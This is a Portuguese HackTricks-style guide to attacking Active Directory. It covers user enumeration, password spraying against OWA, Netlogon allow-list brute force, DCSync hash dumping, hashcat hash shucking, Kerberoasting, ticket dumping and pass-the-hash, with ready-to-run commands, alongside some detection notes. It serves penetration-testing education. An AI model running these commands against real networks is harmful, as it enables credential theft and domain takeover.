# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

O **Active Directory** atua como uma tecnologia fundamental, permitindo que **administradores de rede** criem e gerenciem com eficiência **domínios**, **usuários** e **objetos** dentro de uma rede. Ele foi projetado para escalar, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla os **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **árvores** e **florestas**. Um **domínio** engloba uma coleção de objetos, como **usuários** ou **dispositivos**, que compartilham um banco de dados comum. **Árvores** são grupos desses domínios conectados por uma estrutura compartilhada, e uma **floresta** representa a coleção de várias árvores, interconectadas por meio de **relações de confiança**, formando a camada superior da estrutura organizacional. **Direitos de acesso** e **comunicação** específicos podem ser designados em cada um desses níveis.

Os principais conceitos dentro do **Active Directory** incluem:

1. **Directory** – Contém todas as informações relacionadas aos objetos do Active Directory.
2. **Object** – Representa entidades dentro do diretório, incluindo **usuários**, **grupos** ou **pastas compartilhadas**.
3. **Domain** – Atua como um contêiner para objetos do diretório, com a capacidade de coexistirem vários domínios dentro de uma **floresta**, cada um mantendo sua própria coleção de objetos.
4. **Tree** – Um agrupamento de domínios que compartilham um domínio raiz comum.
5. **Forest** – O nível máximo da estrutura organizacional no Active Directory, composto por várias árvores com **relações de confiança** entre elas.

O **Active Directory Domain Services (AD DS)** engloba uma série de serviços essenciais para o gerenciamento centralizado e a comunicação dentro de uma rede. Esses serviços incluem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia as interações entre **usuários** e **domínios**, incluindo funcionalidades de **autenticação** e **pesquisa**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gerenciamento de **certificados digitais** seguros.
3. **Lightweight Directory Services** – Oferece suporte a aplicações habilitadas para diretórios por meio do **protocolo LDAP**.
4. **Directory Federation Services** – Fornece recursos de **single-sign-on** para autenticar usuários em várias aplicações web durante uma única sessão.
5. **Rights Management** – Ajuda a proteger materiais protegidos por direitos autorais, regulando sua distribuição e uso não autorizados.
6. **DNS Service** – Essencial para a resolução de **nomes de domínio**.

Para obter uma explicação mais detalhada, consulte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender a **atacar um AD**, você precisa **entender** muito bem o **processo de autenticação Kerberos**.\
[**Leia esta página se você ainda não sabe como ele funciona.**](kerberos-authentication.md)

## Cheat Sheet

Você pode consultar bastante conteúdo em [https://wadcoms.github.io/](https://wadcoms.github.io) para obter uma visão rápida dos comandos que podem ser executados para enumerar/explorar um AD.

> [!WARNING]
> A comunicação Kerberos **requer um nome totalmente qualificado (FQDN)** para realizar ações. Se você tentar acessar uma máquina pelo endereço IP, **ela usará NTLM e não Kerberos**.

## Recon Active Directory (No creds/sessions)

Se você apenas tiver acesso a um ambiente AD, mas não possuir credenciais/sessões, poderá:

- **Fazer o Pentest da rede:**
- Fazer o scan da rede, encontrar máquinas e portas abertas e tentar **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [impressoras podem ser alvos muito interessantes](ad-information-in-printers.md).
- Enumerar o DNS pode fornecer informações sobre servidores importantes no domínio, como web, impressoras, shares, VPN, mídia etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulte a [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) geral para obter mais informações sobre como fazer isso.
- **Verificar o acesso null e Guest nos serviços SMB** (isso não funcionará nas versões modernas do Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenenar a rede**
- Coletar credenciais [**personificando serviços com o Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acessar o host [**abusando do relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Coletar credenciais **expondo** [**serviços UPnP falsos com evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrair nomes de usuário/nomes de documentos internos, redes sociais e serviços (principalmente web) dentro dos ambientes do domínio, além de fontes publicamente disponíveis.
- Se você encontrar os nomes completos dos funcionários da empresa, poderá tentar diferentes **convenções de nomes de usuário (**[**leia isto**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
- Ferramentas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

- **Enum SMB/LDAP anônimo:** Consulte as páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enum Kerbrute**: Quando um **nome de usuário inválido é solicitado**, o servidor responderá usando o código de **erro Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo determinar que o nome de usuário era inválido. **Nomes de usuário válidos** provocarão o recebimento do **TGT** em uma resposta AS-REP ou do erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário precisa realizar a pré-autenticação.
- **Sem autenticação contra MS-NRPC**: Usar auth-level = 1 (Sem autenticação) contra a interface MS-NRPC (Netlogon) nos controladores de domínio. O método chama a função `DsrGetDcNameEx2` após fazer o bind da interface MS-NRPC para verificar se o usuário ou computador existe sem nenhuma credencial. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [aqui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Servidor OWA (Outlook Web Access)**

Se você encontrou um desses servidores na rede, também poderá realizar **enumeração de usuários contra ele**. Por exemplo, você poderia usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Você pode encontrar listas de usernames neste [**repositório do github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) e neste outro ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter os **nomes das pessoas que trabalham na empresa** a partir da etapa de recon que deveria ter realizado antes desta. Com o nome e o sobrenome, você poderia usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar usernames potencialmente válidos.

### Abuso da allow-list do canal vulnerável do Netlogon (Onelogon)

Mesmo depois que o **Zerologon** é corrigido no DC, as contas explicitamente incluídas na allow-list ainda podem ficar expostas ao comportamento **legacy/vulnerable** do secure channel do Netlogon. A configuração arriscada é a GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou o valor de registro correspondente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Esse valor é um **security descriptor SDDL** (consulte [Security Descriptors](security-descriptors.md)). Qualquer conta ou grupo ao qual seja concedida a ACE relevante na DACL pode ser alvo. Por exemplo, `O:BAG:BAD:(A;;RC;;;WD)` efetivamente inclui **Everyone** na allow-list.

Fluxo de trabalho prático:

1. **Identifique os principals incluídos na allow-list** verificando tanto o **SYSVOL/GPO** quanto o registro do **DC** em execução.
2. **Resolva os SIDs** encontrados no SDDL para usuários/computadores reais do AD e priorize **contas de máquina de DCs**, **contas de trust** e outras máquinas privilegiadas.
3. Tente repetidamente a **autenticação MS-NRPC / Netlogon** usando a conta incluída na allow-list.
4. Após uma tentativa bem-sucedida, abuse do **password-setting do Netlogon** para redefinir a senha da conta-alvo (o PoC público a define como uma string vazia).<sup>[[9]](#references)[[10]](#references)</sup>

Exemplos rápidos de triagem / laboratório do artefato público:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notas:

- O **scanner** é útil porque a allow-list efetiva pode existir no **SYSVOL**, no **registry** ou em ambos.
- O próprio caminho de exploit é importante porque **não requer privilégios de Domain Admin** depois que uma conta vulnerável é identificada.
- Comprometer uma **conta de máquina de um Domain Controller**, como `DC$`, é especialmente perigoso, pois redefinir essa senha pode habilitar diretamente caminhos mais amplos de **AD takeover**.
- A viabilidade do **brute-force** depende do modo: o artefato público descreve uma abordagem meet-in-the-middle, um **brute force de 24 bits** quando outro computer account está disponível e variantes de **32 bits** mais lentas.

Notas de detecção / hardening:

- Audite a política de allow-list e remova tudo, exceto exceções temporárias de compatibilidade explicitamente necessárias.
- Monitore os eventos **5827/5828/5829/5830/5831** do **System** nos DCs para detectar conexões Netlogon vulneráveis que foram negadas, descobertas ou explicitamente permitidas pela política.
- Trate as contas em `VulnerableChannelAllowList` como de **alto risco** até que a dependência legada seja removida.

### Knowing one or several usernames

Certo, você sabe que já tem um username válido, mas nenhuma password... Então tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tiver** o atributo _DONT_REQ_PREAUTH_, você pode **solicitar uma mensagem AS_REP** para esse usuário, que conterá alguns dados criptografados por uma derivação da password do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as **passwords mais comuns** com cada um dos usuários descobertos; talvez algum usuário esteja usando uma password fraca (tenha em mente a password policy!).
- Observe que você também pode fazer **spray em servidores OWA** para tentar obter acesso aos mail servers dos usuários.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Talvez você consiga **obter** alguns **hashes** de challenge fazendo **poisoning** de alguns protocolos da **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se você conseguiu enumerar o active directory, terá **mais emails e uma compreensão melhor da network**. Talvez seja possível forçar [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM para obter acesso ao ambiente AD.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** para manter o estado do recon de AD por engagement: `workspace create <name>` cria SQLite DBs por protocolo em `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Alterne as views com `proto smb|mssql|winrm` e liste os secrets coletados com `creds`. Faça o purge manual dos dados sensíveis ao terminar: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- A descoberta rápida de subnets com **`netexec smb <cidr>`** exibe **domain**, **OS build**, **requisitos de SMB signing** e **Null Auth**. Membros que exibem `(signing:False)` são **relay-prone**, enquanto os DCs geralmente exigem signing.
- Gere **hostnames em /etc/hosts** diretamente da saída do NetExec para facilitar o targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando **SMB relay para o DC é bloqueado** por signing, ainda verifique a postura do **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / channel binding fraco. Um DC com SMB signing obrigatório, mas com LDAP signing desabilitado, continua sendo um alvo viável de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Vazamentos de credenciais de impressoras no lado do cliente → validação em massa de credenciais do domínio

- Às vezes, as interfaces web/de impressora **incorporam senhas de administrador mascaradas no HTML**. Visualizar o código-fonte/devtools pode revelar o texto claro (por exemplo, `<input value="<password>">`), permitindo acesso com Basic-auth a repositórios de digitalização/impressão.
- Os trabalhos de impressão recuperados podem conter **documentos de onboarding em texto claro** com senhas por usuário. Mantenha os pares alinhados ao testar:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Roubar Credenciais NTLM

Se você puder **acessar outros PCs ou compartilhamentos** com o **usuário nulo ou guest**, poderá **colocar arquivos** (como um arquivo SCF) que, se forem acessados de alguma forma, irão **disparar uma autenticação NTLM contra você**, permitindo **roubar** o **desafio NTLM** para fazer cracking:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & Ataques NT-Candidate

O **hash shucking** trata cada hash NT que você já possui como uma senha candidata para outros formatos mais lentos cujo material de chave é derivado diretamente do hash NT. Em vez de fazer brute-force de passphrases longas em tickets Kerberos RC4, desafios NetNTLM ou credenciais armazenadas em cache, você fornece os hashes NT aos modos NT-candidate do Hashcat e permite que ele valide a reutilização de senhas sem nunca descobrir o plaintext. Isso é especialmente eficaz após um comprometimento do domínio, quando você pode coletar milhares de hashes NT atuais e históricos.<sup>[[5]](#references)</sup>

Use shucking quando:

- Você tiver um corpus NT proveniente de DCSync, dumps de SAM/SECURITY ou credential vaults e precisar testar a reutilização em outros domínios/florestas.
- Você capturar material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM ou blobs DCC/DCC2.
- Você quiser comprovar rapidamente a reutilização de passphrases longas e impossíveis de crackear e fazer pivot imediatamente via Pass-the-Hash.

A técnica **não funciona** contra tipos de criptografia cujas chaves não são o hash NT (por exemplo, Kerberos etype 17/18 AES). Se um domínio exigir somente AES, você deverá voltar aos modos de senha normais.

#### Criando um corpus de hashes NT

- **DCSync/NTDS** – Use `secretsdump.py` com o histórico para obter o maior conjunto possível de hashes NT (e seus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

As entradas do histórico ampliam significativamente o conjunto de candidatos, pois a Microsoft pode armazenar até 24 hashes anteriores por conta. Para conhecer outras formas de coletar secrets do NTDS, consulte:

{{#ref}}
dcsync.md
{{#endref}}

- **Dumps de cache dos endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados locais de SAM/SECURITY e logons de domínio armazenados em cache (DCC/DCC2). Remova duplicatas e adicione esses hashes à mesma lista `nt_candidates.txt`.
- **Rastreie os metadados** – Mantenha o username/domínio que produziu cada hash (mesmo que a wordlist contenha somente hexadecimal). Hashes correspondentes informam imediatamente qual principal está reutilizando uma senha quando o Hashcat exibir o candidato vencedor.
- Prefira candidatos da mesma forest ou de uma forest confiável; isso maximiza a chance de sobreposição durante o shucking.

#### Modos NT-candidate do Hashcat

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Observações:

- As entradas NT-candidate **devem permanecer como hashes NT brutos de 32 caracteres hexadecimais**. Desative os rule engines (sem `-r` e sem hybrid modes), pois a alteração corrompe o material da chave candidata.
- Esses modos não são inerentemente mais rápidos, mas o keyspace do NTLM (~30.000 MH/s em um M3 Max) é ~100× mais rápido que o Kerberos RC4 (~300 MH/s). Testar uma lista NT selecionada é muito mais barato que explorar todo o password space no formato lento.
- Sempre execute a **versão mais recente do Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), pois os modos 31500/31600/35300/35400 foram disponibilizados recentemente.<sup>[[7]](#references)</sup>
- Atualmente não há um modo NT para AS-REQ Pre-Auth, e os etypes AES (19600/19700) exigem a senha em plaintext, pois suas chaves são derivadas via PBKDF2 a partir de senhas UTF-16LE, e não de hashes NT brutos.

#### Exemplo – Kerberoast RC4 (modo 35300)

1. Capture um TGS RC4 para um SPN alvo com um usuário de baixo privilégio (consulte a página de Kerberoast para obter detalhes):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Faça shuck do ticket com sua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

O Hashcat deriva a chave RC4 de cada candidato NT e valida o blob `$krb5tgs$23$...`. Uma correspondência confirma que a service account usa um dos seus hashes NT existentes.

3. Faça pivot imediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente, você poderá recuperar o plaintext posteriormente com `hashcat -m 1000 <matched_hash> wordlists/`, se necessário.

#### Exemplo – Credenciais armazenadas em cache (modo 31600)

1. Faça dump dos logons armazenados em cache a partir de uma workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copie a linha DCC2 do usuário do domínio interessante para `dcc2_highpriv.txt` e faça shuck dela:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uma correspondência bem-sucedida produz o hash NT já conhecido na sua lista, comprovando que o usuário armazenado em cache está reutilizando uma senha. Use-o diretamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou faça brute-force dele no modo NTLM rápido para recuperar a string.

O mesmo workflow se aplica a challenge-responses NetNTLM (`-m 27000/27100`) e DCC (`-m 31500`). Depois que uma correspondência for identificada, você poderá iniciar relay, PtH via SMB/WMI/WinRM ou refazer o cracking do hash NT offline com masks/rules.



## Enumerando o Active Directory COM credenciais/sessão

Para esta fase, você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida**. Se você tiver credenciais válidas ou um shell como usuário do domínio, **deverá lembrar que as opções apresentadas anteriormente ainda são opções para comprometer outros usuários**.

Antes de iniciar a enumeração autenticada, você deve saber o que é o **problema do double hop do Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeração

Comprometer uma conta é um **grande passo para começar a comprometer todo o domínio**, pois você poderá iniciar a **Enumeração do Active Directory:**

Em relação ao [**ASREPRoast**](asreproast.md), agora você pode encontrar todos os usuários potencialmente vulneráveis e, em relação ao [**Password Spraying**](password-spraying.md), pode obter uma **lista de todos os usernames** e tentar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

- Você pode usar o [**CMD para realizar um recon básico**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar [**powershell para recon**](../basic-powershell-for-pentesters/index.html), que será mais stealthy
- Você também pode [**usar o powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
- Outra ferramenta excelente para recon em um active directory é o [**BloodHound**](bloodhound.md). Ele **não é muito stealthy** (dependendo dos métodos de coleta usados), mas, **se você não se importar** com isso, deveria experimentá-lo. Descubra onde os usuários podem usar RDP, encontre caminhos para outros grupos etc.
- **Outras ferramentas automatizadas de enumeração de AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS do AD**](ad-dns-records.md), pois podem conter informações interessantes.
- Uma **ferramenta com GUI** que você pode usar para enumerar o diretório é o **AdExplorer.exe**, da suíte **SysInternal**.
- Você também pode pesquisar no banco de dados LDAP com **ldapsearch** para procurar credenciais nos campos _userPassword_ e _unixUserPassword_, ou até mesmo em _Description_. Consulte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
- Se estiver usando **Linux**, você também poderá enumerar o domínio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também pode tentar ferramentas automatizadas, como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraindo todos os usuários do domínio**

É muito fácil obter todos os usernames do domínio a partir do Windows (`net user /domain`, `Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de Enumeração pareça pequena, ela é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda a enumerar um domínio e pratique até se sentir confortável. Durante um assessment, este será o momento decisivo para encontrar o caminho até DA ou decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **tickets TGS** usados por services vinculados a contas de usuário e fazer cracking da criptografia — que é baseada nas senhas dos usuários — **offline**.

Mais informações sobre isso em:


{{#ref}}
kerberoast.md
{{#endref}}

### Conexão remota (RDP, SSH, FTP, Win-RM etc.)

Depois de obter algumas credenciais, você poderá verificar se tem acesso a alguma **máquina**. Para isso, pode usar o **CrackMapExec** para tentar se conectar a vários servidores com diferentes protocolos, de acordo com suas varreduras de portas.

### Escalação de privilégios local

Se você tiver comprometido credenciais ou uma sessão como usuário regular do domínio e tiver **acesso** com esse usuário a **qualquer máquina do domínio**, deverá tentar encontrar uma forma de **escalar privilégios localmente e fazer loot de credenciais**. Isso ocorre porque somente com privilégios de administrador local você poderá **fazer dump dos hashes de outros usuários** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**escalação de privilégios local no Windows**](../windows-local-privilege-escalation/index.html) e um [**checklist**](../checklist-windows-privilege-escalation.md). Além disso, não se esqueça de usar o [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets da sessão atual

É muito **improvável** que você encontre **tickets** no **usuário atual** que lhe deem **permissão para acessar** recursos inesperados, mas você pode verificar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se você conseguiu enumerar o Active Directory, terá **mais emails e uma compreensão melhor da rede**. Talvez seja possível forçar [**ataques de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** NTLM.**

### Procurar Creds em Compartilhamentos de Computadores | Compartilhamentos SMB

Agora que você tem algumas credenciais básicas, deve verificar se consegue **encontrar** algum **arquivo interessante compartilhado dentro do AD**. Você poderia fazer isso manualmente, mas é uma tarefa muito entediante e repetitiva (especialmente se encontrar centenas de documentos para verificar).

[**Siga este link para aprender sobre as ferramentas que você poderia usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Roubar Creds NTLM

Se você consegue **acessar outros PCs ou compartilhamentos**, pode **colocar arquivos** (como um arquivo SCF) que, se forem acessados de alguma forma, **dispararão uma autenticação NTLM contra você**, permitindo **roubar** o **desafio NTLM** para fazer o crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o controlador de domínio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalação de privilégios no Active Directory COM credenciais/sessão privilegiadas

**Para as técnicas a seguir, um usuário de domínio comum não é suficiente; você precisa de privilégios/credenciais especiais para realizar esses ataques.**

### Extração de hashes

Esperamos que você tenha conseguido **comprometer** alguma conta de **admin local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluindo relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilégios localmente](../windows-local-privilege-escalation/index.html).\
Então, é hora de extrair todos os hashes da memória e localmente.\
[**Leia esta página sobre diferentes formas de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Depois que você tiver o hash de um usuário**, poderá usá-lo para **se passar por ele**.\
Você precisa usar alguma **ferramenta** que **realize** a **autenticação NTLM usando** esse **hash**, **ou** poderá criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, para que, quando qualquer **autenticação NTLM for realizada**, esse **hash seja usado.** A última opção é o que o mimikatz faz.\
[**Leia esta página para obter mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tem como objetivo **usar o hash NTLM do usuário para solicitar tickets Kerberos**, como alternativa ao Pass The Hash comum pelo protocolo NTLM. Portanto, isso pode ser especialmente **útil em redes onde o protocolo NTLM está desabilitado** e apenas o **Kerberos é permitido** como protocolo de autenticação.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez da senha ou dos valores de hash. Esse ticket roubado é então usado para **se passar pelo usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Reutilização de Credenciais

Se você tiver o **hash** ou a **senha** de um **administrado**r local, deverá tentar **fazer login localmente** em outros **PCs** usando-o.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note que isto é bastante **ruidoso** e o **LAPS** o **mitigaria**.

### Abuso de MSSQL e Trusted Links

Se um usuário tiver privilégios para **acessar instâncias MSSQL**, ele poderá usá-las para **executar comandos** no host MSSQL (se estiver sendo executado como SA), **roubar** o **hash** NetNTLM ou até mesmo realizar um **relay** **attack**.\
Além disso, se uma instância MSSQL for confiável (database link) por outra instância MSSQL, e o usuário tiver privilégios sobre o banco de dados confiável, ele poderá **usar a relação de confiança para executar consultas também na outra instância**. Essas relações de confiança podem ser encadeadas e, em determinado momento, o usuário poderá encontrar um banco de dados mal configurado no qual consiga executar comandos.\
**Os links entre bancos de dados funcionam até mesmo entre forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de ativos/deployment de TI

Suites de inventário e deployment de terceiros frequentemente expõem caminhos poderosos para credenciais e execução de código. Veja:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se você encontrar qualquer objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e tiver privilégios de domínio no computador, poderá fazer dump dos TGTs da memória de todos os usuários que fizerem login no computador.\
Assim, se um **Domain Admin fizer login no computador**, você poderá fazer dump do TGT dele e personificá-lo usando [Pass the Ticket](pass-the-ticket.md).\
